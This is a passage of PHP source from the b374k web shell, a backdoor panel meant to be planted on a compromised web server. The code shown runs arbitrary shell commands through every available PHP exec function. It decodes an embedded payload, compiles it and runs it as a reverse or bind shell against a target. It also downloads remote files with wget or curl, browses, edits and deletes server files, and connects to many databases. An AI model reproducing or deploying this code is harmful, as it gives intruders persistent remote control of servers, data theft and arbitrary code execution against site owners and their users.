      for($s_j = 0; $s_j <= $s_i; $s_j++) $s_pz .= $s_ps[$s_j].DS;
        $s_pu .= "<a href='".$s_self."cd=".pl($s_pz)."'>".$s_ps[$s_i]." ".DS." </a>";
    }
    return trim($s_pu);
}
function hss($s_t){
    return htmlspecialchars($s_t, 2 | 1);
}
function ru($str){
    return (is_array($str))? array_map("rawurldecode", $str):rawurldecode($str);
}
function pl($str){
    return hss(rawurlencode($str));
}
function pf($f){
    return "\"".$f."\"";
}
function cs($s_t){
    return str_replace(array(" ", "\"", "'"), "_", $s_t);
}
function ss($s_t){
    return rawurldecode($s_t);
}
function notif($s){
    return "<div class='notif'>".$s."</div>";
}
function rs($s_rstype,$s_rstarget,$s_rscode){
    $s_result = $s_fpath = "";
    $s_fc = gzinflate(base64_decode($s_rscode));
    $s_errperm = "Directory ".getcwd().DS." is not writable, please change to a writable one";
    $s_errgcc = "Unable to compile using gcc";
    $s_errjavac = "Unable to compile using javac";
    $s_split = explode("_", $s_rstype);
    $s_method = $s_split[0];
    $s_lang = $s_split[1];
    if($s_lang=="py" || $s_lang=="pl" || $s_lang=="rb" || $s_lang=="js"){
        if($s_lang=="py") $s_runlang = "python";
        elseif($s_lang=="pl") $s_runlang = "perl";
        elseif($s_lang=="rb") $s_runlang = "ruby";
        elseif($s_lang=="js") $s_runlang = "node";
        $s_fpath = "b374k_rs.".$s_lang;
        if(@is_file($s_fpath)) unlink($s_fpath);
        if($s_file = fopen($s_fpath, "w")){
            fwrite($s_file, $s_fc);
            fclose($s_file);
            if(@is_file($s_fpath)){
                $s_result = exe("chmod +x ".$s_fpath);
                if($s_runlang=="node"){
                    if(check_access("node")!==false) $s_result = exe($s_runlang." ".$s_fpath." ".$s_rstarget);
                    elseif(check_access("nodejs")!==false) $s_result = exe($s_runlang."js ".$s_fpath." ".$s_rstarget);
                }
                else $s_result = exe($s_runlang." ".$s_fpath." ".$s_rstarget);
            }
            else $s_result = $s_errperm;
        }
        else $s_result = $s_errperm;
    }
    elseif($s_lang=="c"){
        $s_fpath = "b374k_rs";
        if(@is_file($s_fpath)) unlink($s_fpath);
        if(@is_file($s_fpath.".c")) unlink($s_fpath.".c");
        if($s_file = fopen($s_fpath.".c", "w")){
            fwrite($s_file,$s_fc);
            fclose($s_file);
            if(@is_file($s_fpath.".c")){
                $s_result = exe("gcc ".$s_fpath.".c -o ".$s_fpath);
                if(@is_file($s_fpath)){
                    $s_result = exe("chmod +x ".$s_fpath);
                    $s_result = exe("./".$s_fpath." ".$s_rstarget);
                }
                else $s_result = $s_errgcc;
            }
            else $s_result = $s_errperm;
        }
        else $s_result = $s_errperm;
    }
    elseif($s_lang=="win"){
        $s_fpath = "b374k_rs.exe";
        if(@is_file($s_fpath)) unlink($s_fpath);
        if($s_file = fopen($s_fpath,"w")){
            fwrite($s_file,$s_fc);
            fclose($s_file);
            if(@is_file($s_fpath)){
                $s_result = exe($s_fpath." ".$s_rstarget);
            }
            else $s_result = $s_errperm;
        }
        else $s_result = $s_errperm;
    }
    elseif($s_lang=="java"){
        $s_fpath = "b374k_rs";
        if(@is_file($s_fpath.".java")) unlink($s_fpath.".java");
        if(@is_file($s_fpath.".class")) unlink($s_fpath.".class");
        if($s_file = fopen($s_fpath.".java", "w")){
            fwrite($s_file,$s_fc);
            fclose($s_file);
            if(@is_file($s_fpath.".java")){
                $s_result = exe("javac ".$s_fpath.".java");
                if(@is_file($s_fpath.".class")){
                    $s_result = exe("java ".$s_fpath." ".$s_rstarget);
                }
                else $s_result = $s_errjavac;
            }
            else $s_result = $s_errperm;
        }
        else $s_result = $s_errperm;
    }
    elseif($s_lang=="php"){
        $s_result = eval("?>".$s_fc);
    }
    if(@is_file($s_fpath)) unlink($s_fpath);
    if(@is_file($s_fpath.".c")) unlink($s_fpath.".c");
    if(@is_file($s_fpath.".java")) unlink($s_fpath.".java");
    if(@is_file($s_fpath.".class")) unlink($s_fpath.".class");
    if(@is_file($s_fpath."\$pt.class")) unlink($s_fpath."\$pt.class");
    return $s_result;
}
function geol($str){
    $nl = PHP_EOL;
    if(preg_match("/\r\n/", $str, $r)) $nl = "\r\n";
    else{
        if(preg_match("/\n/", $str, $r)) $nl = "\n";
        elseif(preg_match("/\r/", $str, $r)) $nl = "\r";
    }
    return bin2hex($nl);
}
function ts($s_s){
    if($s_s<=0) return 0;
    $s_w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
    $s_e = floor(log($s_s)/log(1024));
    return sprintf('%.2f '.$s_w[$s_e], ($s_s/pow(1024, floor($s_e))));
}
function gs($s_f){
    $s_s = @filesize($s_f);
    if($s_s !== false){
        if($s_s<=0) return 0;
        return ts($s_s);
    }
    else return "???";
}
function gp($s_f){
    if($s_m = @fileperms($s_f)){
        $s_p = 'u';
        if(($s_m & 0xC000) == 0xC000)$s_p = 's';
        elseif(($s_m & 0xA000) == 0xA000)$s_p = 'l';
        elseif(($s_m & 0x8000) == 0x8000)$s_p = '-';
        elseif(($s_m & 0x6000) == 0x6000)$s_p = 'b';
        elseif(($s_m & 0x4000) == 0x4000)$s_p = 'd';
        elseif(($s_m & 0x2000) == 0x2000)$s_p = 'c';
        elseif(($s_m & 0x1000) == 0x1000)$s_p = 'p';
        $s_p .= ($s_m & 00400)? 'r':'-';
        $s_p .= ($s_m & 00200)? 'w':'-';
        $s_p .= ($s_m & 00100)? 'x':'-';
        $s_p .= ($s_m & 00040)? 'r':'-';
        $s_p .= ($s_m & 00020)? 'w':'-';
        $s_p .= ($s_m & 00010)? 'x':'-';
        $s_p .= ($s_m & 00004)? 'r':'-';
        $s_p .= ($s_m & 00002)? 'w':'-';
        $s_p .= ($s_m & 00001)? 'x':'-';
        return $s_p;
    }
    else return "???????????";
}
function exe($s_c){
    $s_out = "";
    $s_c = $s_c." 2>&1";
    if(is_callable('system')) {
        ob_start();
        @system($s_c);
        $s_out = ob_get_contents();
        ob_end_clean();
        if(!empty($s_out)) return $s_out;
    }
    if(is_callable('shell_exec')){
        $s_out = @shell_exec($s_c);
        if(!empty($s_out)) return $s_out;
    }
    if(is_callable('exec')) {
        @exec($s_c,$s_r);
        if(!empty($s_r)) foreach($s_r as $s_s) $s_out .= $s_s;
        if(!empty($s_out)) return $s_out;
    }
    if(is_callable('passthru')) {
        ob_start();
        @passthru($s_c);
        $s_out = ob_get_contents();
        ob_end_clean();
        if(!empty($s_out)) return $s_out;
    }
    if(is_callable('proc_open')) {
        $s_descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w"));
        $s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
        if (is_resource($s_proc)) {
            while($s_si = fgets($s_pipes[1])) {
                if(!empty($s_si)) $s_out .= $s_si;
            }
            while($s_se = fgets($s_pipes[2])) {
                if(!empty($s_se)) $s_out .= $s_se;
            }
        }
        @proc_close($s_proc);
        if(!empty($s_out)) return $s_out;
    }
    if(is_callable('popen')){
        $s_f = @popen($s_c, 'r');
        if($s_f){
            while(!feof($s_f)){
                $s_out .= fread($s_f, 2096);
            }
            pclose($s_f);
        }
        if(!empty($s_out)) return $s_out;
    }
    return "";
}
function rmdirs($s){
    $s = (substr($s,-1)=='/')? $s:$s.'/';
    if($dh = opendir($s)){
        while(($f = readdir($dh))!==false){
            if(($f!='.')&&($f!='..')){
                $f = $s.$f;
                if(@is_dir($f)) rmdirs($f);
                else @unlink($f);
            }
        }
        closedir($dh);
        @rmdir($s);
    }
}
function copys($s,$d,$c=0){
    if($dh = opendir($s)){
        if(!@is_dir($d)) @mkdir($d);
        while(($f = readdir($dh))!==false){
            if(($f!='.')&&($f!='..')){
                if(@is_dir($s.DS.$f)) copys($s.DS.$f,$d.DS.$f);
                else copy($s.DS.$f,$d.DS.$f);
            }
        }
        closedir($dh);
    }
}
function getallfiles($s_dir){
    $s_f = glob($s_dir.'*');
    for($s_i = 0; $s_i<count($s_f); $s_i++){
        if(@is_dir($s_f[$s_i])){
            $s_a = glob($s_f[$s_i].DS.'*');
            if(is_array($s_f) && is_array($s_a)) $s_f = array_merge($s_f, $s_a);
        }
    }
    return $s_f;
}
function dlfile($s_u,$s_p){
    global $s_wget, $s_lwpdownload, $s_lynx, $s_curl;
    if(!preg_match("/[a-z]+:\/\/.+/",$s_u)) return false;
    $s_n = basename($s_u);
    if($s_t = @fgc($s_u)){
        if(@is_file($s_p)) unlink($s_p);
        if($s_f = fopen($s_p,"w")){
            fwrite($s_f, $s_t);
            fclose($s_f);
            if(@is_file($s_p)) return true;
        }
    }
    if($s_wget){
        $buff = exe("wget ".$s_u." -O ".$s_p);
        if(@is_file($s_p)) return true;
    }
    if($s_curl){
        $buff = exe("curl ".$s_u." -o ".$s_p);
        if(@is_file($s_p)) return true;
    }
    if($s_lynx){
        $buff = exe("lynx -source ".$s_u." > ".$s_p);
        if(@is_file($s_p)) return true;
    }
    if($s_lwpdownload){
        $buff = exe("lwp-download ".$s_u." ".$s_p);
        if(@is_file($s_p)) return true;
    }
    return false;
}
function get_writabledir(){
    if(!$s_d = getenv("TEMP")) if(!$s_d = getenv("TMP")) if(!$s_d = getenv("TMPDIR")){
        if(@is_writable("/tmp")) $s_d = "/tmp/";
        else if(@is_writable(".")) $s_d = ".".DS;
    }
    return cp($s_d);
}
function zip($s_srcarr, $s_dest){
    if(!extension_loaded('zip')) return false;
    if(class_exists("ZipArchive")){
        $s_zip = new ZipArchive();
        if(!$s_zip->open($s_dest, 1)) return false;
        if(!is_array($s_srcarr)) $s_srcarr = array($s_srcarr);
        foreach($s_srcarr as $s_src){
            $s_src = str_replace('\\', '/', $s_src);
            if(@is_dir($s_src)){
                $s_files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($s_src), 1);
                foreach($s_files as $s_file){
                    $s_file = str_replace('\\', '/', $s_file);
                    if(in_array(substr($s_file, strrpos($s_file, '/')+1), array('.', '..'))) continue;
                    if (@is_dir($s_file)===true)    $s_zip->addEmptyDir(str_replace($s_src.'/', '', $s_file.'/'));
                    else if (@is_file($s_file)===true) $s_zip->addFromString(str_replace($s_src.'/', '', $s_file), @fgc($s_file));
                }
            }
            elseif(@is_file($s_src) === true) $s_zip->addFromString(basename($s_src), @fgc($s_src));
        }
        $s_zip->close();
        return true;
    }
}
function check_access($s_lang){
    $s_s = false;
    $ver = "";
    switch($s_lang){
        case "python":
            $s_cek = strtolower(exe("python -h"));
            if(strpos($s_cek,"usage")!==false) $ver = exe("python -V");
            break;
        case "perl":
            $s_cek = strtolower(exe("perl -h"));
            if(strpos($s_cek,"usage")!==false) $ver = exe("perl -e \"print \$]\"");
            break;
        case "ruby":
            $s_cek = strtolower(exe("ruby -h"));
            if(strpos($s_cek,"usage")!==false) $ver = exe("ruby -v");
            break;
        case "node":
            $s_cek = strtolower(exe("node -h"));
            if(strpos($s_cek,"usage")!==false) $ver = exe("node -v");
            break;
        case "nodejs":
            $s_cek = strtolower(exe("nodejs -h"));
            if(strpos($s_cek,"usage")!==false) $ver = exe("nodejs -v");
            break;
        case "gcc":
            $s_cek = strtolower(exe("gcc --help"));
            if(strpos($s_cek,"usage")!==false){
                $s_ver = exe("gcc --version");
                $s_ver = explode("\n",$s_ver);
                if(count($s_ver)>0) $ver = $s_ver[0];
            }
            break;
        case "tar":
            $s_cek = strtolower(exe("tar --help"));
            if(strpos($s_cek,"usage")!==false){
                $s_ver = exe("tar --version");
                $s_ver = explode("\n",$s_ver);
                if(count($s_ver)>0) $ver = $s_ver[0];
            }
            break;
        case "java":
            $s_cek = strtolower(exe("java -help"));
            if(strpos($s_cek,"usage")!==false) $ver = str_replace("\n", ", ", exe("java -version"));
            break;
        case "javac":
            $s_cek = strtolower(exe("javac -help"));
            if(strpos($s_cek,"usage")!==false) $ver = str_replace("\n", ", ", exe("javac -version"));
            break;            
        case "wget":
            $s_cek = strtolower(exe("wget --help"));
            if(strpos($s_cek,"usage")!==false){
                $s_ver = exe("wget --version");
                $s_ver = explode("\n",$s_ver);
                if(count($s_ver)>0) $ver = $s_ver[0];
            }
            break;
        case "lwpdownload":
            $s_cek = strtolower(exe("lwp-download --help"));
            if(strpos($s_cek,"usage")!==false){
                $s_ver = exe("lwp-download --version");
                $s_ver = explode("\n",$s_ver);
                if(count($s_ver)>0) $ver = $s_ver[0];
            }
            break;
        case "lynx":
            $s_cek = strtolower(exe("lynx --help"));
            if(strpos($s_cek,"usage")!==false){
                $s_ver = exe("lynx -version");
                $s_ver = explode("\n",$s_ver);
                if(count($s_ver)>0) $ver = $s_ver[0];
            }
            break;
        case "curl":
            $s_cek = strtolower(exe("curl --help"));
            if(strpos($s_cek,"usage")!==false){
                $s_ver = exe("curl --version");
                $s_ver = explode("\n",$s_ver);
                if(count($s_ver)>0) $ver = $s_ver[0];
            }
            break;
        default:
            return false;
    }
    if(!empty($ver)) $s_s = $ver;
    return $s_s;
}
function showdir($s_cwd){
    global $s_self, $s_win, $s_posix, $s_tar;
    $s_fname = $s_dname = array();
    $s_total_file = $s_total_dir = 0;
    if($s_dh = @opendir($s_cwd)){
        while($s_file = @readdir($s_dh)){
            if(@is_dir($s_file)) $s_dname[] = $s_file;
            elseif(@is_file($s_file))$s_fname[] = $s_file;
        }
        closedir($s_dh);
    }
    natcasesort($s_fname);
    natcasesort($s_dname);
    $s_list = array_merge($s_dname,$s_fname);
    if($s_win){
        chdir("..");
        if(cp(getcwd())==cp($s_cwd)) array_unshift($s_list, ".");
        chdir($s_cwd);
    }
    $s_path = explode(DS,$s_cwd);
    $s_tree = sizeof($s_path);
    $s_parent = "";
    if($s_tree > 2) for($s_i = 0; $s_i<$s_tree-2; $s_i++) $s_parent .= $s_path[$s_i].DS;
    else $s_parent = $s_cwd;
    $s_owner_html = (!$s_win && $s_posix)? "<th style='width:140px;min-width:140px;'>owner:group</th>":"";
    $s_colspan = (!$s_win && $s_posix)? "5" : "4";
    $s_buff = "<table class='explore sortable'><thead><tr><th style='width:24px;min-width:24px;' class='sorttable_nosort'></th><th
style='min-width:150px;'>name</th><th style='width:74px;min-width:74px;'>size</th>".$s_owner_html."<th style='width:80px;min-width:80px;'>perms</th><th
style='width:150px;min-width:150px;'>modified</th><th style='width:200px;min-width:200px;' class='sorttable_nosort'>action</th></tr></thead><tbody>";
    foreach($s_list as $s_l){
        if(!$s_win && $s_posix){
            $s_name = posix_getpwuid(fileowner($s_l));
            $s_group = posix_getgrgid(filegroup($s_l));
            $s_owner = $s_name['name']."<span class='gaya'>:</span>".$s_group['name'];
            $s_owner_html = "<td style='text-align:center;'>".$s_owner."</td>";
        }
        $s_lhref = $s_lname = $s_laction = "";
        if(@is_dir($s_l)){
            if($s_l=="."){
                $s_lhref = $s_self."cd=".pl($s_cwd);
                $s_lsize = "LINK";
                $s_laction = "<span id='titik1'><a href='".$s_self."cd=".pl($s_cwd)."&find=".pl($s_cwd)."'>find</a> | <a
href='".$s_self."cd=".pl($s_cwd)."&x=upload"."'>upl</a> | <a href='".$s_self."cd=".pl($s_cwd)."&edit=".pl($s_cwd)."newfile_1&new=yes"."'>+file</a> | <a
href=\"javascript:tukar('titik1','', 'mkdir','newfolder_1');\">+dir</a></span><div id='titik1_form'></div>";
            }
            elseif($s_l==".."){
                $s_lhref = $s_self."cd=".pl($s_parent);
                $s_lsize = "LINK";
                $s_laction = "<span id='titik2'><a href='".$s_self."cd=".pl($s_parent)."&find=".pl($s_parent)."'>find</a> | <a
href='".$s_self."cd=".pl($s_parent)."&x=upload"."'>upl</a> | <a href='".$s_self."cd=".pl($s_parent)."&edit=".pl($s_parent)."newfile_1&new=yes"."'>+file</a> | <a
href=\"javascript:tukar('titik2','".adds($s_parent)."', 'mkdir','newfolder_1');\">+dir</a></span><div id='titik2_form'></div>";
            }
            else{
                $s_lhref = $s_self."cd=".pl($s_cwd.$s_l.DS);
                $s_lsize = "DIR";
                $s_laction = "<span id='".cs($s_l)."_'><a href='".$s_self."cd=".pl($s_cwd.$s_l.DS)."&find=".pl($s_cwd.$s_l.DS)."'>find</a> | <a
href='".$s_self."cd=".pl($s_cwd.$s_l.DS)."&x=upload"."'>upl</a> | <a
href=\"javascript:tukar('".cs($s_l)."_','','rename','".adds($s_l)."','".adds($s_l)."');\">ren</a> | <a
href='".$s_self."cd=".pl($s_cwd)."&del=".pl($s_l)."'>del</a></span><div id='".cs($s_l)."__form'></div>";
                $s_total_dir++;
            }
            $s_lname = "[ ".$s_l." ]";
            $s_lsizetit = "0";
            $s_lnametit = "dir : ".$s_l;
        }
        else{
            $s_lhref = $s_self."view=".pl($s_cwd.$s_l);
            $s_lname = $s_l;
            $s_lsize = gs($s_l);
            $s_lsizetit = @filesize($s_l);
            $s_lnametit = "file : ".$s_l;
            $s_laction = "<span id='".cs($s_l)."_'><a href='".$s_self."edit=".pl($s_cwd.$s_l)."'>edit</a> | <a href='".$s_self."hexedit=".pl($s_cwd.$s_l)."'>hex</a> | <a
href=\"javascript:tukar('".cs($s_l)."_','','rename','".adds($s_l)."','".adds($s_l)."');\">ren</a> | <a href='".$s_self."del=".pl($s_cwd.$s_l)."'>del</a> | <a
href='".$s_self."dl=".pl($s_cwd.$s_l)."'>dl</a></span><div id='".cs($s_l)."__form'></div>";
            $s_total_file++;
        }
        $s_cboxval = $s_cwd.$s_l;
        if($s_l=='.') $s_cboxval = $s_cwd;
        if($s_l=='..') $s_cboxval = $s_parent;
        $s_cboxes_id = substr(md5($s_lhref),0,8);
        $s_cboxes = "<input id='".$s_cboxes_id."' name='cbox' value='".hss($s_cboxval)."' type='checkbox' class='css-checkbox' onchange='hilite(this);' /><label
for='".$s_cboxes_id."' class='css-label'></label>";
        $s_ltime = filemtime($s_l);
        $s_buff .= "<tr><td style='text-align:center;text-indent:4px;'>".$s_cboxes."</td><td class='xpl' title='".$s_lnametit."' ondblclick=\"return
go('".adds($s_lhref)."',event);\"><a href='".$s_lhref."'>".$s_lname."</a></td><td title='".$s_lsizetit."'>".$s_lsize."</td>".$s_owner_html."<td
class='ce'>".gp($s_l)."</td><td class='ce' title='".$s_ltime."'>".@date("d-M-Y H:i:s",$s_ltime)."</td><td>".$s_laction."</td></tr>";
    }
    $s_buff .= "</tbody>";
    $s_extract = ""; $s_compress = "";
    if(class_exists("ZipArchive")){
        $s_extract .= "<option value='extractzip'>extract (zip)</option>";
        $s_compress .= "<option value='compresszip'>compress (zip)</option>";
    }
    if($s_tar){
        $s_extract .= "<option value='extracttar'>extract (tar)</option><option value='extracttargz'>extract (tar.gz)</option>";
        $s_compress .="<option value='compresstar'>compress (tar)</option><option value='compresstargz'>compress (tar.gz)</option>";
    }
    $s_extcom = ($s_extract!="" && $s_compress!="")? $s_extract."<option value='' disabled>-</option>".$s_compress:$s_extract.$s_compress;
    $s_buff .= "<tfoot><tr class='cbox_selected'><td class='cbox_all'><input id='checkalll' type='checkbox' name='abox' class='css-checkbox' onclick='checkall();'
/> <label for='checkalll' class='css-label'></label></td><td><form action='".$s_self."' method='post'><select id='massact' class='inputzbut'
onchange='massactgo();' style='width:100%;height:20px;margin:0;'><option value='' disabled selected>Action</option><option value='cut'>cut</option><option
value='copy'>copy</option><option value='paste'>paste</option><option value='delete'>delete</option><option value='' disabled>-</option><option
value='chmod'>chmod</option><option value='touch'>touch</option><option value='' disabled>-</option>".$s_extcom."</select><noscript><input type='button'
value='Go !' class='inputzbut' onclick='massactgo();' /></noscript></form></td><td colspan='".$s_colspan."' style='text-align:left;'>Total : ".$s_total_file."
files, ".$s_total_dir." Directories<span id='total_selected'></span></td></tr></tfoot></table>";
    return $s_buff;
}
function sql_connect($s_sqltype, $s_sqlhost, $s_sqluser, $s_sqlpass){
    if($s_sqltype == 'mysql'){ 
        if(class_exists('mysqli')) return new mysqli($s_sqlhost, $s_sqluser, $s_sqlpass);
        elseif(function_exists('mysql_connect')) return @mysql_connect($s_sqlhost, $s_sqluser, $s_sqlpass); 
    }
    elseif($s_sqltype == 'mssql'){
        if(function_exists('sqlsrv_connect')){
            $s_coninfo = array("UID"=>$s_sqluser, "PWD"=>$s_sqlpass);
            return @sqlsrv_connect($s_sqlhost,$s_coninfo);
        }
        elseif(function_exists('mssql_connect')) return @mssql_connect($s_sqlhost, $s_sqluser, $s_sqlpass);
    }
    elseif($s_sqltype == 'pgsql'){
        $s_hosts = explode(":", $s_sqlhost);
        if(count($s_hosts)==2){
            $s_host_str = "host=".$s_hosts[0]." port=".$s_hosts[1];
        }
        else $s_host_str = "host=".$s_sqlhost;
        if(function_exists('pg_connect')) return @pg_connect("$s_host_str user=$s_sqluser password=$s_sqlpass");
    }
    elseif($s_sqltype == 'oracle'){ if(function_exists('oci_connect')) return @oci_connect($s_sqluser, $s_sqlpass, $s_sqlhost); }
    elseif($s_sqltype == 'sqlite3'){
        if(class_exists('SQLite3')) if(!empty($s_sqlhost)) return new SQLite3($s_sqlhost);
        else return false;
    }
    elseif($s_sqltype == 'sqlite'){ if(function_exists('sqlite_open')) return @sqlite_open($s_sqlhost); }
    elseif($s_sqltype == 'odbc'){ if(function_exists('odbc_connect')) return @odbc_connect($s_sqlhost, $s_sqluser, $s_sqlpass); }
    elseif($s_sqltype == 'pdo'){
        if(class_exists('PDO')) if(!empty($s_sqlhost)) return new PDO($s_sqlhost, $s_sqluser, $s_sqlpass);
        else return false;
    }
    return false;
}
function sql_query($s_sqltype, $s_query, $s_con){
    if($s_sqltype == 'mysql'){
        if(class_exists('mysqli')) return $s_con->query($s_query);
        elseif(function_exists('mysql_query')) return mysql_query($s_query);
    }
    elseif($s_sqltype == 'mssql'){
        if(function_exists('sqlsrv_query')) return sqlsrv_query($s_con,$s_query);
        elseif(function_exists('mssql_query')) return mssql_query($s_query);
    }
    elseif($s_sqltype == 'pgsql') return pg_query($s_query);
    elseif($s_sqltype == 'oracle') return oci_execute(oci_parse($s_con, $s_query));
    elseif($s_sqltype == 'sqlite3') return $s_con->query($s_query);
    elseif($s_sqltype == 'sqlite') return sqlite_query($s_con, $s_query);
    elseif($s_sqltype == 'odbc') return odbc_exec($s_con, $s_query);
    elseif($s_sqltype == 'pdo') return $s_con->query($s_query);
}
function sql_num_rows($s_sqltype,$s_hasil){
    if($s_sqltype == 'mysql'){
        if(class_exists('mysqli_result')) return $s_hasil->mysqli_num_rows;
        elseif(function_exists('mysql_num_rows')) return mysql_num_rows($s_hasil);
    }
    elseif($s_sqltype == 'mssql'){
        if(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($s_hasil);
        elseif(function_exists('mssql_num_rows')) return mssql_num_rows($s_hasil);
    }
    elseif($s_sqltype == 'pgsql') return pg_num_rows($s_hasil);
    elseif($s_sqltype == 'oracle') return oci_num_rows($s_hasil);
    elseif($s_sqltype == 'sqlite3'){
        $s_metadata = $s_hasil->fetchArray();
        if(is_array($s_metadata)) return $s_metadata['count'];
    }
    elseif($s_sqltype == 'sqlite') return sqlite_num_rows($s_hasil);
    elseif($s_sqltype == 'odbc') return odbc_num_rows($s_hasil);
    elseif($s_sqltype == 'pdo') return $s_hasil->rowCount();
}
function sql_num_fields($s_sqltype, $s_hasil){
    if($s_sqltype == 'mysql'){
        if(class_exists('mysqli_result')) return $s_hasil->field_count;
        elseif(function_exists('mysql_num_fields')) return mysql_num_fields($s_hasil);
    }
    elseif($s_sqltype == 'mssql'){
        if(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($s_hasil);
        elseif(function_exists('mssql_num_fields')) return mssql_num_fields($s_hasil);
    }
    elseif($s_sqltype == 'pgsql') return pg_num_fields($s_hasil);
    elseif($s_sqltype == 'oracle') return oci_num_fields($s_hasil);
    elseif($s_sqltype == 'sqlite3') return $s_hasil->numColumns();
    elseif($s_sqltype == 'sqlite') return sqlite_num_fields($s_hasil);
    elseif($s_sqltype == 'odbc') return odbc_num_fields($s_hasil);
    elseif($s_sqltype == 'pdo') return $s_hasil->columnCount();
}
function sql_field_name($s_sqltype,$s_hasil,$s_i){
    if($s_sqltype == 'mysql'){
        if(class_exists('mysqli_result')) { $z=$s_hasil->fetch_field();return $z->name;}
        elseif(function_exists('mysql_field_name')) return mysql_field_name($s_hasil,$s_i);
    }
    elseif($s_sqltype == 'mssql'){
        if(function_exists('sqlsrv_field_metadata')){
            $s_metadata = sqlsrv_field_metadata($s_hasil);
            if(is_array($s_metadata)){
                $s_metadata=$s_metadata[$s_i];
            }
            if(is_array($s_metadata)) return $s_metadata['Name'];
        }
        elseif(function_exists('mssql_field_name')) return mssql_field_name($s_hasil,$s_i);
    }
    elseif($s_sqltype == 'pgsql') return pg_field_name($s_hasil,$s_i);
    elseif($s_sqltype == 'oracle') return oci_field_name($s_hasil,$s_i+1);
    elseif($s_sqltype == 'sqlite3') return $s_hasil->columnName($s_i);
    elseif($s_sqltype == 'sqlite') return sqlite_field_name($s_hasil,$s_i);
    elseif($s_sqltype == 'odbc') return odbc_field_name($s_hasil,$s_i+1);
    elseif($s_sqltype == 'pdo'){
        $s_res = $s_hasil->getColumnMeta($s_i);
        return $s_res['name'];
    }
}
function sql_fetch_data($s_sqltype,$s_hasil){
    if($s_sqltype == 'mysql'){
        if(class_exists('mysqli_result')) return $s_hasil->fetch_row();
        elseif(function_exists('mysql_fetch_row')) return mysql_fetch_row($s_hasil);
    }
    elseif($s_sqltype == 'mssql'){
        if(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($s_hasil,1);
        elseif(function_exists('mssql_fetch_row')) return mssql_fetch_row($s_hasil);
    }
    elseif($s_sqltype == 'pgsql') return pg_fetch_row($s_hasil);
    elseif($s_sqltype == 'oracle') return oci_fetch_row($s_hasil);
    elseif($s_sqltype == 'sqlite3') return $s_hasil->fetchArray(1);
    elseif($s_sqltype == 'sqlite') return sqlite_fetch_array($s_hasil,1);
    elseif($s_sqltype == 'odbc') return odbc_fetch_array($s_hasil);
    elseif($s_sqltype == 'pdo') return $s_hasil->fetch(2);
}
function sql_close($s_sqltype,$s_con){
    if($s_sqltype == 'mysql'){
        if(class_exists('mysqli')) return $s_con->close();
        elseif(function_exists('mysql_close')) return mysql_close($s_con);
    }
    elseif($s_sqltype == 'mssql'){
        if(function_exists('sqlsrv_close')) return sqlsrv_close($s_con);
        elseif(function_exists('mssql_close')) return mssql_close($s_con);
    }
    elseif($s_sqltype == 'pgsql') return pg_close($s_con);
    elseif($s_sqltype == 'oracle') return oci_close($s_con);
    elseif($s_sqltype == 'sqlite3') return $s_con->close();
    elseif($s_sqltype == 'sqlite') return sqlite_close($s_con);
    elseif($s_sqltype == 'odbc') return odbc_close($s_con);
    elseif($s_sqltype == 'pdo') return $s_con = null;
}
if(!function_exists('str_split')){
    function str_split($s_t,$s_s=1){
        $s_a = array();
        for($s_i = 0; $s_i<strlen($s_t);){
            $s_a[] = substr($s_t,$s_i,$s_s);
            $s_i += $s_s;
        }
        return $s_a;
    }
}
$s_theme = "dark"; 
if(isset($_COOKIE['theme'])) $s_theme = $_COOKIE['theme'];
if(isset($_GP['x']) && ($_GP['x']=='switch')){
    if(isset($_COOKIE['theme'])) $s_theme = $_COOKIE['theme'];
    if($s_theme=="bright") $s_theme = "dark";
    else $s_theme = "bright";
    setcookie("theme", $s_theme ,time() + $s_login_time);
}
$s_highlight_dark = array("4C9CAF", "888888", "87DF45", "EEEEEE" , "87DF45");
$s_highlight_bright = array("B36350", "777777", "7820BA", "111111" , "007FFF");
global $s_self, $s_win, $s_posix;
$s_self = "?";
$s_cek1 = basename($_SERVER['SCRIPT_FILENAME']);
$s_cek2 = substr(basename(__FILE__),0,strlen($s_cek1));
if(isset($_COOKIE['b374k_included'])){
    if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
    else{
        $s_self = "?";
        setcookie("b374k_included", "0" ,time() - $s_login_time);
        setcookie("s_self", $s_self ,time() + $s_login_time);
    }
}
else{
    if(strcmp($s_cek1,$s_cek2)!=0){
        if(!isset($_COOKIE['s_home'])){
            $s_home = "?".$_SERVER["QUERY_STRING"]."&";
            setcookie("s_home", $s_home ,time() + $s_login_time);
        }
        if(isset($s_home)) $s_self = $s_home;
        elseif(isset($_COOKIE['s_home'])) $s_self = $_COOKIE['s_home'];
        setcookie("b374k_included", "1" ,time() + $s_login_time);
        setcookie("s_self", $s_self ,time() + $s_login_time);
    }
    else{
        $s_self = "?";
        setcookie("b374k_included", "0" ,time() - $s_login_time);
        setcookie("s_self", $s_self ,time() + $s_login_time);
    }
}
$s_cwd = "";
if(isset($_GP['|'])) showcode($s_css);
elseif(isset($_GP['!'])) showcode($s_js);
if($s_auth){
    $s_software = getenv("SERVER_SOFTWARE");
    $s_system = php_uname();
    $s_win = (strtolower(substr($s_system,0,3)) == "win")? true : false;
    $s_posix = (function_exists("posix_getpwuid"))? true : false;
    if(isset($_GP['cd'])){
        $s_dd = $_GP['cd'];
        if(@is_dir($s_dd)){
            $s_cwd = cp($s_dd);
            chdir($s_cwd);
            setcookie("cwd", $s_cwd ,time() + $s_login_time);
        }
        else $s_cwd = isset($_COOKIE['cwd'])? cp($_COOKIE['cwd']):cp(getcwd());;
    }
    else{
        if(isset($_COOKIE['cwd'])){
            $s_dd = ss($_COOKIE['cwd']);
            if(@is_dir($s_dd)){
                $s_cwd = cp($s_dd);
                chdir($s_cwd);
            }
        }
        else $s_cwd = cp(getcwd());
    }
    if(!$s_win && $s_posix){
        $s_userarr = posix_getpwuid(posix_geteuid());
        if(isset($s_userarr['name'])) $s_user = $s_userarr['name'];
        else $s_user = "$";
    }
    else {
        $s_user = get_current_user();
    }
    $s_prompt = $s_user." &gt;";
    $s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
    $s_my_ip = $_SERVER['REMOTE_ADDR'];
    $s_result = "";
